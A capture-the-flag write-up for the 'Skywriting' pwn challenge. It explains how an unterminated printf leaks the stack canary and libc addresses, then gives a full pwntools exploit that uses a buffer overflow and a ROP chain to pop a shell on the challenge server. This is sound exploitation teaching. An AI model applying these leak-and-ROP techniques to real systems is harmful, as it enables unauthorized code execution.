# Skywriting

There's a lot of unnecessary bloat that I'll mostly ignore.

Cracking open the binary in ghidra, we see that the first input we get is actually a scanf, scanning a decimal integer into a variable. It then checks this integer against 1. If the integer isn't 1, it pops a shell - zsh. Nothing happens remotely, likely they do not have zsh. So that's not very useful.

What happens if the integer is 1? It continues with the rest of the execution of the program. The program opens up a never-ending prompt in which it asks for an input. If the input is the same as notflag{a\_cloud\_is\_just\_someone\_elses\_computer}\n when strcmp-ed,the program tells us we did it and rets. This will be useful later on to deliver our final exploit.

In the prompt, 0x200 bytes are read into rbp-0x90, creating a clear buffer overflow vulnerability.

Sadly, however, every protection is on. Canary, RELRO, PIE and most likely ASLR. We're going to need to leak somehow.. but how?

The read function does not null terminate. That means our input will not be null terminated as a string unless we enter a null byte. Not only this, but the program calls printf\("%s??", input\), printing the input back to us. Printf will only know the end of a string once it hits a null byte, meaning we can leak values off of the stack!

For example, say this was the stack

00 00 00 00 00 00 00 00 00 \

we could write like so

41 41 41 41 41 41 41 41 0a \

now, when it prints, it'll keep printing, leaking the canary and ~~saved RBP~~ .fini address.

NOTE: Canaries start with null bytes! We will have to overflow one byte of the canary so that we can read the rest. It doesn't matter that we overflow the canary until we make the program ret, but by then we will know what the full canary is and be able to replace it.

We can use this again to leak the saved ret address, which will be `__libc_start_main_ret.`

Once all these values are leaked, we send the finished exploit. notflag{a\_cloud\_is\_just\_someone\_elses\_computer}\n\x00 + padding + canary + more padding + poprdi + /bin/sh address + retgadget + systemaddress

NOTE: We can leak the binary base through the .fini address. We don't strictly _need_ it here, as libc has ROP gadgets, but it's useful.

```python
from pwn import *
mode = sys.argv[1]
NUM_TO_CANARY = 0x90 - 0x8
NUM_TO_RET = NUM_TO_CANARY+16
retgadget  = 0x000000000000078e # ret
poprdi = 0x0000000000000bd3 # pop rdi ; ret
e = ELF("./sky")
def getproc():
    if mode == 'local':
        return e.process()
    else:
        return remote('2020.redpwnc.tf', 31034)
def setup():
    p = getproc()
    p.recvline()
    p.sendline("1")
    p.recvuntil("shot: ")
    return p 
def getoutput(data):
    global p
    p.sendline(data)
    p.recvuntil(data + b'\n')
    output = p.recvuntil("??")[:-2]
    p.recvuntil("shot: ")
    return output
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if mode == 'local' else "/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6")
p = setup()
#Leak canary and binary base
libret = 0x21b97 if mode == 'remote' else 0x26e0b
leak = getoutput(b"A" * (NUM_TO_CANARY))
canary = u64(b'\x00' + leak[:7])
log.info(f"Canary: {hex(canary)}")
pause()
fini = u64(leak[7:] + b'\x00\x00')
e.address = fini - 0xb70
log.info(f"Binary base: {hex(e.address)}")
#Leak libc base by leaking the libc start main ret
leak2 = getoutput(b"A" * (NUM_TO_RET-1))
libret_leak = u64(leak2 + b'\x00\x00')
log.info(f"Libc start main ret: {hex(libret_leak)}")
libcbase = libret_leak - libret
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
retgadget += e.address
poprdi += e.address
# Everything has been leaked. Develop the final payload.
final =  flat(canary,b'C'*8,poprdi,next(libc.search(b"/bin/sh\x00")),retgadget,libc.symbols['system'],word_size=64)
padding = b"notflag{a_cloud_is_just_someone_elses_computer}\n\x00"
padding += b'B' * (NUM_TO_CANARY - len(padding))
p.sendline(padding + final)
p.interactive()
```

